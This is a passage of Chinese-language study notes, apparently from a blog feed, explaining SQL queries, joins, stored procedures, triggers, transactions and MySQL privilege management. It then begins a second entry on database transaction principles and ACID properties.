<p><strong>AND 和 OR</strong>  用于连接多个过滤条件。优先处理 AND，当一个过滤表达式涉及到多个 AND 和 OR 时，可以使用 () 来决定优先级，使得优先级关系更清晰。</p>
<p><strong>IN</strong>  操作符用于匹配一组值，其后也可以接一个 SELECT 子句，从而匹配子查询得到的一组值。</p>
<p><strong>NOT</strong>  操作符用于否定一个条件。</p>
<h1 id="十、通配符" tabindex="-1"> 十、通配符</h1>
<p>通配符也是用在过滤语句中，但它只能用于文本字段。</p>
<ul>
<li>
<p><strong>%</strong>  匹配 &gt;=0 个任意字符；</p>
</li>
<li>
<p><strong>_</strong>  匹配 ==1 个任意字符；</p>
</li>
<li>
<p><strong>[ ]</strong>  可以匹配集合内的字符，例如 [ab] 将匹配字符 a 或者 b。用脱字符 ^ 可以对其进行否定，也就是不匹配集合内的字符。</p>
</li>
</ul>
<p>使用 Like 来进行通配符匹配。</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>WHERE</span> col <span>LIKE</span> <span>'[^AB]%'</span><span>;</span> <span>-- 不以 A 和 B 开头的任意文本</span>
</code></pre></div><p>不要滥用通配符，通配符位于开头处匹配会非常慢。</p>
<h1 id="十一、计算字段" tabindex="-1"> 十一、计算字段</h1>
<p>在数据库服务器上完成数据的转换和格式化的工作往往比客户端上快得多，并且转换和格式化后的数据量更少的话可以减少网络通信量。</p>
<p>计算字段通常需要使用  <strong>AS</strong>  来取别名，否则输出的时候字段名为计算表达式。</p>
<div><pre><code><span>SELECT</span> col1 <span>*</span> col2 <span>AS</span> alias
<span>FROM</span> mytable<span>;</span>
</code></pre></div><p><strong>CONCAT()</strong>  用于连接两个字段。许多数据库会使用空格把一个值填充为列宽，因此连接的结果会出现一些不必要的空格，使用 <strong>TRIM()</strong> 可以去除首尾空格。</p>
<div><pre><code><span>SELECT</span> CONCAT<span>(</span>TRIM<span>(</span>col1<span>)</span><span>,</span> <span>'('</span><span>,</span> TRIM<span>(</span>col2<span>)</span><span>,</span> <span>')'</span><span>)</span> <span>AS</span> concat_col
<span>FROM</span> mytable<span>;</span>
</code></pre></div><h1 id="十二、函数" tabindex="-1"> 十二、函数</h1>
<p>各个 DBMS 的函数都是不相同的，因此不可移植，以下主要是 MySQL 的函数。</p>
<h2 id="汇总" tabindex="-1"> 汇总</h2>
<table>
<thead>
<tr>
<th style="text-align:center">函 数</th>
<th style="text-align:center">说 明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">AVG()</td>
<td style="text-align:center">返回某列的平均值</td>
</tr>
<tr>
<td style="text-align:center">COUNT()</td>
<td style="text-align:center">返回某列的行数</td>
</tr>
<tr>
<td style="text-align:center">MAX()</td>
<td style="text-align:center">返回某列的最大值</td>
</tr>
<tr>
<td style="text-align:center">MIN()</td>
<td style="text-align:center">返回某列的最小值</td>
</tr>
<tr>
<td style="text-align:center">SUM()</td>
<td style="text-align:center">返回某列值之和</td>
</tr>
</tbody>
</table>
<p>AVG() 会忽略 NULL 行。</p>
<p>使用 DISTINCT 可以汇总不同的值。</p>
<div><pre><code><span>SELECT</span> <span>AVG</span><span>(</span><span>DISTINCT</span> col1<span>)</span> <span>AS</span> avg_col
<span>FROM</span> mytable<span>;</span>
</code></pre></div><h2 id="文本处理" tabindex="-1"> 文本处理</h2>
<table>
<thead>
<tr>
<th style="text-align:center">函数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">LEFT()</td>
<td style="text-align:center">左边的字符</td>
</tr>
<tr>
<td style="text-align:center">RIGHT()</td>
<td style="text-align:center">右边的字符</td>
</tr>
<tr>
<td style="text-align:center">LOWER()</td>
<td style="text-align:center">转换为小写字符</td>
</tr>
<tr>
<td style="text-align:center">UPPER()</td>
<td style="text-align:center">转换为大写字符</td>
</tr>
<tr>
<td style="text-align:center">LTRIM()</td>
<td style="text-align:center">去除左边的空格</td>
</tr>
<tr>
<td style="text-align:center">RTRIM()</td>
<td style="text-align:center">去除右边的空格</td>
</tr>
<tr>
<td style="text-align:center">LENGTH()</td>
<td style="text-align:center">长度</td>
</tr>
<tr>
<td style="text-align:center">SOUNDEX()</td>
<td style="text-align:center">转换为语音值</td>
</tr>
</tbody>
</table>
<p>其中， <strong>SOUNDEX()</strong>  可以将一个字符串转换为描述其语音表示的字母数字模式。</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>WHERE</span> SOUNDEX<span>(</span>col1<span>)</span> <span>=</span> SOUNDEX<span>(</span><span>'apple'</span><span>)</span>
</code></pre></div><h2 id="日期和时间处理" tabindex="-1"> 日期和时间处理</h2>
<ul>
<li>日期格式：YYYY-MM-DD</li>
<li>时间格式：HH:MM:SS</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">函 数</th>
<th style="text-align:center">说 明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">ADDDATE()</td>
<td style="text-align:center">增加一个日期（天、周等）</td>
</tr>
<tr>
<td style="text-align:center">ADDTIME()</td>
<td style="text-align:center">增加一个时间（时、分等）</td>
</tr>
<tr>
<td style="text-align:center">CURDATE()</td>
<td style="text-align:center">返回当前日期</td>
</tr>
<tr>
<td style="text-align:center">CURTIME()</td>
<td style="text-align:center">返回当前时间</td>
</tr>
<tr>
<td style="text-align:center">DATE()</td>
<td style="text-align:center">返回日期时间的日期部分</td>
</tr>
<tr>
<td style="text-align:center">DATEDIFF()</td>
<td style="text-align:center">计算两个日期之差</td>
</tr>
<tr>
<td style="text-align:center">DATE_ADD()</td>
<td style="text-align:center">高度灵活的日期运算函数</td>
</tr>
<tr>
<td style="text-align:center">DATE_FORMAT()</td>
<td style="text-align:center">返回一个格式化的日期或时间串</td>
</tr>
<tr>
<td style="text-align:center">DAY()</td>
<td style="text-align:center">返回一个日期的天数部分</td>
</tr>
<tr>
<td style="text-align:center">DAYOFWEEK()</td>
<td style="text-align:center">对于一个日期，返回对应的星期几</td>
</tr>
<tr>
<td style="text-align:center">HOUR()</td>
<td style="text-align:center">返回一个时间的小时部分</td>
</tr>
<tr>
<td style="text-align:center">MINUTE()</td>
<td style="text-align:center">返回一个时间的分钟部分</td>
</tr>
<tr>
<td style="text-align:center">MONTH()</td>
<td style="text-align:center">返回一个日期的月份部分</td>
</tr>
<tr>
<td style="text-align:center">NOW()</td>
<td style="text-align:center">返回当前日期和时间</td>
</tr>
<tr>
<td style="text-align:center">SECOND()</td>
<td style="text-align:center">返回一个时间的秒部分</td>
</tr>
<tr>
<td style="text-align:center">TIME()</td>
<td style="text-align:center">返回一个日期时间的时间部分</td>
</tr>
<tr>
<td style="text-align:center">YEAR()</td>
<td style="text-align:center">返回一个日期的年份部分</td>
</tr>
</tbody>
</table>
<div><pre><code>mysql<span>></span> <span>SELECT</span> <span>NOW</span><span>(</span><span>)</span><span>;</span>
</code></pre></div><div><pre><code>2018-4-14 20:25:11
</code></pre></div><h2 id="数值处理" tabindex="-1"> 数值处理</h2>
<table>
<thead>
<tr>
<th style="text-align:center">函数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">SIN()</td>
<td style="text-align:center">正弦</td>
</tr>
<tr>
<td style="text-align:center">COS()</td>
<td style="text-align:center">余弦</td>
</tr>
<tr>
<td style="text-align:center">TAN()</td>
<td style="text-align:center">正切</td>
</tr>
<tr>
<td style="text-align:center">ABS()</td>
<td style="text-align:center">绝对值</td>
</tr>
<tr>
<td style="text-align:center">SQRT()</td>
<td style="text-align:center">平方根</td>
</tr>
<tr>
<td style="text-align:center">MOD()</td>
<td style="text-align:center">余数</td>
</tr>
<tr>
<td style="text-align:center">EXP()</td>
<td style="text-align:center">指数</td>
</tr>
<tr>
<td style="text-align:center">PI()</td>
<td style="text-align:center">圆周率</td>
</tr>
<tr>
<td style="text-align:center">RAND()</td>
<td style="text-align:center">随机数</td>
</tr>
</tbody>
</table>
<h1 id="十三、分组" tabindex="-1"> 十三、分组</h1>
<p>把具有相同的数据值的行放在同一组中。</p>
<p>可以对同一分组数据使用汇总函数进行处理，例如求分组数据的平均值等。</p>
<p>指定的分组字段除了能按该字段进行分组，也会自动按该字段进行排序。</p>
<div><pre><code><span>SELECT</span> col<span>,</span> <span>COUNT</span><span>(</span><span>*</span><span>)</span> <span>AS</span> num
<span>FROM</span> mytable
<span>GROUP</span> <span>BY</span> col<span>;</span>
</code></pre></div><p>GROUP BY 自动按分组字段进行排序，ORDER BY 也可以按汇总字段来进行排序。</p>
<div><pre><code><span>SELECT</span> col<span>,</span> <span>COUNT</span><span>(</span><span>*</span><span>)</span> <span>AS</span> num
<span>FROM</span> mytable
<span>GROUP</span> <span>BY</span> col
<span>ORDER</span> <span>BY</span> num<span>;</span>
</code></pre></div><p>WHERE 过滤行，HAVING 过滤分组，行过滤应当先于分组过滤。</p>
<div><pre><code><span>SELECT</span> col<span>,</span> <span>COUNT</span><span>(</span><span>*</span><span>)</span> <span>AS</span> num
<span>FROM</span> mytable
<span>WHERE</span> col <span>></span> <span>2</span>
<span>GROUP</span> <span>BY</span> col
<span>HAVING</span> num <span>>=</span> <span>2</span><span>;</span>
</code></pre></div><p>分组规定：</p>
<ul>
<li>GROUP BY 子句出现在 WHERE 子句之后，ORDER BY 子句之前；</li>
<li>除了汇总字段外，SELECT 语句中的每一字段都必须在 GROUP BY 子句中给出；</li>
<li>NULL 的行会单独分为一组；</li>
<li>大多数 SQL 实现不支持 GROUP BY 列具有可变长度的数据类型。</li>
</ul>
<h1 id="十四、子查询" tabindex="-1"> 十四、子查询</h1>
<p>子查询中只能返回一个字段的数据。</p>
<p>可以将子查询的结果作为 WHRER 语句的过滤条件：</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable1
<span>WHERE</span> col1 <span>IN</span> <span>(</span><span>SELECT</span> col2
               <span>FROM</span> mytable2<span>)</span><span>;</span>
</code></pre></div><p>下面的语句可以检索出客户的订单数量，子查询语句会对第一个查询检索出的每个客户执行一次：</p>
<div><pre><code><span>SELECT</span> cust_name<span>,</span> <span>(</span><span>SELECT</span> <span>COUNT</span><span>(</span><span>*</span><span>)</span>
                   <span>FROM</span> Orders
                   <span>WHERE</span> Orders<span>.</span>cust_id <span>=</span> Customers<span>.</span>cust_id<span>)</span>
                   <span>AS</span> orders_num
<span>FROM</span> Customers
<span>ORDER</span> <span>BY</span> cust_name<span>;</span>
</code></pre></div><h1 id="十五、连接" tabindex="-1"> 十五、连接</h1>
<p>连接用于连接多个表，使用 JOIN 关键字，并且条件语句使用 ON 而不是 WHERE。</p>
<p>连接可以替换子查询，并且比子查询的效率一般会更快。</p>
<p>可以用 AS 给列名、计算字段和表名取别名，给表名取别名是为了简化 SQL 语句以及连接相同表。</p>
<h2 id="内连接" tabindex="-1"> 内连接</h2>
<p>内连接又称等值连接，使用 INNER JOIN 关键字。</p>
<div><pre><code><span>SELECT</span> A<span>.</span><span>value</span><span>,</span> B<span>.</span><span>value</span>
<span>FROM</span> tablea <span>AS</span> A <span>INNER</span> <span>JOIN</span> tableb <span>AS</span> B
<span>ON</span> A<span>.</span><span>key</span> <span>=</span> B<span>.</span><span>key</span><span>;</span>
</code></pre></div><p>可以不明确使用 INNER JOIN，而使用普通查询并在 WHERE 中将两个表中要连接的列用等值方法连接起来。</p>
<div><pre><code><span>SELECT</span> A<span>.</span><span>value</span><span>,</span> B<span>.</span><span>value</span>
<span>FROM</span> tablea <span>AS</span> A<span>,</span> tableb <span>AS</span> B
<span>WHERE</span> A<span>.</span><span>key</span> <span>=</span> B<span>.</span><span>key</span><span>;</span>
</code></pre></div><h2 id="自连接" tabindex="-1"> 自连接</h2>
<p>自连接可以看成内连接的一种，只是连接的表是自身而已。</p>
<p>一张员工表，包含员工姓名和员工所属部门，要找出与 Jim 处在同一部门的所有员工姓名。</p>
<p>子查询版本</p>
<div><pre><code><span>SELECT</span> name
<span>FROM</span> employee
<span>WHERE</span> department <span>=</span> <span>(</span>
      <span>SELECT</span> department
      <span>FROM</span> employee
      <span>WHERE</span> name <span>=</span> <span>"Jim"</span><span>)</span><span>;</span>
</code></pre></div><p>自连接版本</p>
<div><pre><code><span>SELECT</span> e1<span>.</span>name
<span>FROM</span> employee <span>AS</span> e1 <span>INNER</span> <span>JOIN</span> employee <span>AS</span> e2
<span>ON</span> e1<span>.</span>department <span>=</span> e2<span>.</span>department
      <span>AND</span> e2<span>.</span>name <span>=</span> <span>"Jim"</span><span>;</span>
</code></pre></div><h2 id="自然连接" tabindex="-1"> 自然连接</h2>
<p>自然连接是把同名列通过等值测试连接起来的，同名列可以有多个。</p>
<p>内连接和自然连接的区别：内连接提供连接的列，而自然连接自动连接所有同名列。</p>
<div><pre><code><span>SELECT</span> A<span>.</span><span>value</span><span>,</span> B<span>.</span><span>value</span>
<span>FROM</span> tablea <span>AS</span> A <span>NATURAL</span> <span>JOIN</span> tableb <span>AS</span> B<span>;</span>
</code></pre></div><h2 id="外连接" tabindex="-1"> 外连接</h2>
<p>外连接保留了没有关联的那些行。分为左外连接，右外连接以及全外连接，左外连接就是保留左表没有关联的行。</p>
<p>检索所有顾客的订单信息，包括还没有订单信息的顾客。</p>
<div><pre><code><span>SELECT</span> Customers<span>.</span>cust_id<span>,</span> Orders<span>.</span>order_num
<span>FROM</span> Customers <span>LEFT</span> <span>OUTER</span> <span>JOIN</span> Orders
<span>ON</span> Customers<span>.</span>cust_id <span>=</span> Orders<span>.</span>cust_id<span>;</span>
</code></pre></div><p>customers 表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">cust_id</th>
<th style="text-align:center">cust_name</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">a</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">b</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">c</td>
</tr>
</tbody>
</table>
<p>orders 表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">order_id</th>
<th style="text-align:center">cust_id</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">3</td>
</tr>
</tbody>
</table>
<p>结果：</p>
<table>
<thead>
<tr>
<th style="text-align:center">cust_id</th>
<th style="text-align:center">cust_name</th>
<th style="text-align:center">order_id</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">a</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">a</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">c</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">c</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">b</td>
<td style="text-align:center">Null</td>
</tr>
</tbody>
</table>
<h1 id="十六、组合查询" tabindex="-1"> 十六、组合查询</h1>
<p>使用  <strong>UNION</strong>  来组合两个查询，如果第一个查询返回 M 行，第二个查询返回 N 行，那么组合查询的结果一般为 M+N 行。</p>
<p>每个查询必须包含相同的列、表达式和聚集函数。</p>
<p>默认会去除相同行，如果需要保留相同行，使用 UNION ALL。</p>
<p>只能包含一个 ORDER BY 子句，并且必须位于语句的最后。</p>
<div><pre><code><span>SELECT</span> col
<span>FROM</span> mytable
<span>WHERE</span> col <span>=</span> <span>1</span>
<span>UNION</span>
<span>SELECT</span> col
<span>FROM</span> mytable
<span>WHERE</span> col <span>=</span><span>2</span><span>;</span>
</code></pre></div><h1 id="十七、视图" tabindex="-1"> 十七、视图</h1>
<p>视图是虚拟的表，本身不包含数据，也就不能对其进行索引操作。</p>
<p>对视图的操作和对普通表的操作一样。</p>
<p>视图具有如下好处：</p>
<ul>
<li>简化复杂的 SQL 操作，比如复杂的连接；</li>
<li>只使用实际表的一部分数据；</li>
<li>通过只给用户访问视图的权限，保证数据的安全性；</li>
<li>更改数据格式和表示。</li>
</ul>
<div><pre><code><span>CREATE</span> <span>VIEW</span> myview <span>AS</span>
<span>SELECT</span> Concat<span>(</span>col1<span>,</span> col2<span>)</span> <span>AS</span> concat_col<span>,</span> col3<span>*</span>col4 <span>AS</span> compute_col
<span>FROM</span> mytable
<span>WHERE</span> col5 <span>=</span> val<span>;</span>
</code></pre></div><h1 id="十八、存储过程" tabindex="-1"> 十八、存储过程</h1>
<p>存储过程可以看成是对一系列 SQL 操作的批处理。</p>
<p>使用存储过程的好处：</p>
<ul>
<li>代码封装，保证了一定的安全性；</li>
<li>代码复用；</li>
<li>由于是预先编译，因此具有很高的性能。</li>
</ul>
<p>命令行中创建存储过程需要自定义分隔符，因为命令行是以 ; 为结束符，而存储过程中也包含了分号，因此会错误把这部分分号当成是结束符，造成语法错误。</p>
<p>包含 in、out 和 inout 三种参数。</p>
<p>给变量赋值都需要用 select into 语句。</p>
<p>每次只能给一个变量赋值，不支持集合的操作。</p>
<div><pre><code><span>delimiter</span> <span>//</span>

<span>create</span> <span>procedure</span> myprocedure<span>(</span> <span>out</span> ret <span>int</span> <span>)</span>
    <span>begin</span>
        <span>declare</span> y <span>int</span><span>;</span>
        <span>select</span> <span>sum</span><span>(</span>col1<span>)</span>
        <span>from</span> mytable
        <span>into</span> y<span>;</span>
        <span>select</span> y<span>*</span>y <span>into</span> ret<span>;</span>
    <span>end</span> <span>//</span>

<span>delimiter</span> <span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>call</span> myprocedure<span>(</span><span>@ret</span><span>)</span><span>;</span>
<span>select</span> <span>@ret</span><span>;</span>
</code></pre></div><h1 id="十九、游标" tabindex="-1"> 十九、游标</h1>
<p>在存储过程中使用游标可以对一个结果集进行移动遍历。</p>
<p>游标主要用于交互式应用，其中用户需要对数据集中的任意行进行浏览和修改。</p>
<p>使用游标的四个步骤：</p>
<ol>
<li>声明游标，这个过程没有实际检索出数据；</li>
<li>打开游标；</li>
<li>取出数据；</li>
<li>关闭游标；</li>
</ol>
<div><pre><code><span>delimiter</span> <span>//</span>
<span>create</span> <span>procedure</span> myprocedure<span>(</span><span>out</span> ret <span>int</span><span>)</span>
    <span>begin</span>
        <span>declare</span> done <span>boolean</span> <span>default</span> <span>0</span><span>;</span>

        <span>declare</span> mycursor <span>cursor</span> <span>for</span>
        <span>select</span> col1 <span>from</span> mytable<span>;</span>
        <span># 定义了一个 continue handler，当 sqlstate '02000' 这个条件出现时，会执行 set done = 1</span>
        <span>declare</span> <span>continue</span> <span>handler</span> <span>for</span> sqlstate <span>'02000'</span> <span>set</span> done <span>=</span> <span>1</span><span>;</span>

        <span>open</span> mycursor<span>;</span>

        <span>repeat</span>
            <span>fetch</span> mycursor <span>into</span> ret<span>;</span>
            <span>select</span> ret<span>;</span>
        until done <span>end</span> <span>repeat</span><span>;</span>

        <span>close</span> mycursor<span>;</span>
    <span>end</span> <span>//</span>
 <span>delimiter</span> <span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div><h1 id="二十、触发器" tabindex="-1"> 二十、触发器</h1>
<p>触发器会在某个表执行以下语句时而自动执行：DELETE、INSERT、UPDATE。</p>
<p>触发器必须指定在语句执行之前还是之后自动执行，之前执行使用 BEFORE 关键字，之后执行使用 AFTER 关键字。BEFORE 用于数据验证和净化，AFTER 用于审计跟踪，将修改记录到另外一张表中。</p>
<p>INSERT 触发器包含一个名为 NEW 的虚拟表。</p>
<div><pre><code><span>CREATE</span> <span>TRIGGER</span> mytrigger <span>AFTER</span> <span>INSERT</span> <span>ON</span> mytable
<span>FOR EACH ROW</span> <span>SELECT</span> NEW<span>.</span>col <span>into</span> <span>@result</span><span>;</span>

<span>SELECT</span> <span>@result</span><span>;</span> <span>-- 获取结果</span>
</code></pre></div><p>DELETE 触发器包含一个名为 OLD 的虚拟表，并且是只读的。</p>
<p>UPDATE 触发器包含一个名为 NEW 和一个名为 OLD 的虚拟表，其中 NEW 是可以被修改的，而 OLD 是只读的。</p>
<p>MySQL 不允许在触发器中使用 CALL 语句，也就是不能调用存储过程。</p>
<h1 id="二十一、事务管理" tabindex="-1"> 二十一、事务管理</h1>
<p>基本术语：</p>
<ul>
<li>事务（transaction）指一组 SQL 语句；</li>
<li>回退（rollback）指撤销指定 SQL 语句的过程；</li>
<li>提交（commit）指将未存储的 SQL 语句结果写入数据库表；</li>
<li>保留点（savepoint）指事务处理中设置的临时占位符（placeholder），你可以对它发布回退（与回退整个事务处理不同）。</li>
</ul>
<p>不能回退 SELECT 语句，回退 SELECT 语句也没意义；也不能回退 CREATE 和 DROP 语句。</p>
<p>MySQL 的事务提交默认是隐式提交，每执行一条语句就把这条语句当成一个事务然后进行提交。当出现 START TRANSACTION 语句时，会关闭隐式提交；当 COMMIT 或 ROLLBACK 语句执行后，事务会自动关闭，重新恢复隐式提交。</p>
<p>设置 autocommit 为 0 可以取消自动提交；autocommit 标记是针对每个连接而不是针对服务器的。</p>
<p>如果没有设置保留点，ROLLBACK 会回退到 START TRANSACTION 语句处；如果设置了保留点，并且在 ROLLBACK 中指定该保留点，则会回退到该保留点。</p>
<div><pre><code><span>START</span> <span>TRANSACTION</span>
<span>// ...</span>
<span>SAVEPOINT</span> delete1
<span>// ...</span>
<span>ROLLBACK</span> <span>TO</span> delete1
<span>// ...</span>
<span>COMMIT</span>
</code></pre></div><h1 id="二十二、字符集" tabindex="-1"> 二十二、字符集</h1>
<p>基本术语：</p>
<ul>
<li>字符集为字母和符号的集合；</li>
<li>编码为某个字符集成员的内部表示；</li>
<li>校对字符指定如何比较，主要用于排序和分组。</li>
</ul>
<p>除了给表指定字符集和校对外，也可以给列指定：</p>
<div><pre><code><span>CREATE</span> <span>TABLE</span> mytable
<span>(</span>col <span>VARCHAR</span><span>(</span><span>10</span><span>)</span> <span>CHARACTER</span> <span>SET</span> latin <span>COLLATE</span> latin1_general_ci <span>)</span>
<span>DEFAULT</span> <span>CHARACTER</span> <span>SET</span> hebrew <span>COLLATE</span> hebrew_general_ci<span>;</span>
</code></pre></div><p>可以在排序、分组时指定校对：</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
<span>ORDER</span> <span>BY</span> col <span>COLLATE</span> latin1_general_ci<span>;</span>
</code></pre></div><h1 id="二十三、权限管理" tabindex="-1"> 二十三、权限管理</h1>
<p>MySQL 的账户信息保存在 mysql 这个数据库中。</p>
<div><pre><code><span>USE</span> mysql<span>;</span>
<span>SELECT</span> <span>user</span> <span>FROM</span> <span>user</span><span>;</span>
</code></pre></div><p><strong>创建账户</strong></p>
<p>新创建的账户没有任何权限。</p>
<div><pre><code><span>CREATE</span> <span>USER</span> myuser IDENTIFIED <span>BY</span> <span>'mypassword'</span><span>;</span>
</code></pre></div><p><strong>修改账户名</strong></p>
<div><pre><code><span>RENAME</span> <span>USER</span> myuser <span>TO</span> newuser<span>;</span>
</code></pre></div><p><strong>删除账户</strong></p>
<div><pre><code><span>DROP</span> <span>USER</span> myuser<span>;</span>
</code></pre></div><p><strong>查看权限</strong></p>
<div><pre><code><span>SHOW</span> GRANTS <span>FOR</span> myuser<span>;</span>
</code></pre></div><p><strong>授予权限</strong></p>
<p>账户用 username@host 的形式定义，username@% 使用的是默认主机名。</p>
<div><pre><code><span>GRANT</span> <span>SELECT</span><span>,</span> <span>INSERT</span> <span>ON</span> mydatabase<span>.</span><span>*</span> <span>TO</span> myuser<span>;</span>
</code></pre></div><p><strong>删除权限</strong></p>
<p>GRANT 和 REVOKE 可在几个层次上控制访问权限：</p>
<ul>
<li>整个服务器，使用 GRANT ALL 和 REVOKE ALL；</li>
<li>整个数据库，使用 ON database.*；</li>
<li>特定的表，使用 ON database.table；</li>
<li>特定的列；</li>
<li>特定的存储过程。</li>
</ul>
<div><pre><code><span>REVOKE</span> <span>SELECT</span><span>,</span> <span>INSERT</span> <span>ON</span> mydatabase<span>.</span><span>*</span> <span>FROM</span> myuser<span>;</span>
</code></pre></div><p><strong>更改密码</strong></p>
<p>必须使用 Password() 函数进行加密。</p>
<div><pre><code><span>SET</span> PASSWROD <span>FOR</span> myuser <span>=</span> Password<span>(</span><span>'new_password'</span><span>)</span><span>;</span>
</code></pre></div><h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li>BenForta. SQL 必知必会 [M]. 人民邮电出版社, 2013.</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">数据库系统原理</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.html"/>
    <updated>2022-05-16T11:59:04.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="一、事务" tabindex="-1"> 一、事务</h1>
<h2 id="概念" tabindex="-1"> 概念</h2>
<p>事务指的是满足 ACID 特性的一组操作，可以通过 Commit 提交一个事务，也可以使用 Rollback 进行回滚。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f74144be-857a-40cd-8ec7-87626ef4e20b.png" width="400px"> </div><br>
<h2 id="acid" tabindex="-1"> ACID</h2>
<h3 id="_1-原子性-atomicity" tabindex="-1"> 1. 原子性（Atomicity）</h3>
<p>事务被视为不可分割的最小单元，事务的所有操作要么全部提交成功，要么全部失败回滚。</p>
<p>回滚可以用回滚日志来实现，回滚日志记录着事务所执行的修改操作，在回滚时反向执行这些修改操作即可。</p>
<h3 id="_2-一致性-consistency" tabindex="-1"> 2. 一致性（Consistency）</h3>
<p>数据库在事务执行前后都保持一致性状态。在一致性状态下，所有事务对一个数据的读取结果都是相同的。</p>
<h3 id="_3-隔离性-isolation" tabindex="-1"> 3. 隔离性（Isolation）</h3>
<p>一个事务所做的修改在最终提交以前，对其它事务是不可见的。</p>
<h3 id="_4-持久性-durability" tabindex="-1"> 4. 持久性（Durability）</h3>
<p>一旦事务提交，则其所做的修改将会永远保存到数据库中。即使系统发生崩溃，事务执行的结果也不能丢失。</p>
<p>使用重做日志来保证持久性。</p>
<hr>
<p>事务的 ACID 特性概念简单，但不是很好理解，主要是因为这几个特性不是一种平级关系：</p>
<ul>
<li>只有满足一致性，事务的执行结果才是正确的。</li>
<li>在无并发的情况下，事务串行执行，隔离性一定能够满足。此时只要能满足原子性，就一定能满足一致性。</li>
<li>在并发的情况下，多个事务并行执行，事务不仅要满足原子性，还需要满足隔离性，才能满足一致性。</li>
<li>事务满足持久化是为了能应对数据库崩溃的情况。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/417bc315-4409-48c6-83e0-59e8d405429e.jpg" width="400px"> </div><br>
<h2 id="autocommit" tabindex="-1"> AUTOCOMMIT</h2>
<p>MySQL 默认采用自动提交模式。也就是说，如果不显式使用<code>START TRANSACTION</code>语句来开始一个事务，那么每个查询都会被当做一个事务自动提交。</p>
<h1 id="二、并发一致性问题" tabindex="-1"> 二、并发一致性问题</h1>
<p>在并发环境下，事务的隔离性很难保证，因此会出现很多并发一致性问题。</p>
<h2 id="丢失修改" tabindex="-1"> 丢失修改</h2>
<p>T<sub>1</sub> 和 T<sub>2</sub> 两个事务都对一个数据进行修改，T<sub>1</sub> 先修改，T<sub>2</sub> 随后修改，T<sub>2</sub> 的修改覆盖了 T<sub>1</sub> 的修改。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/75184b58-c627-4edc-8dcf-605762ebb733.png" width="320px"> </div><br>
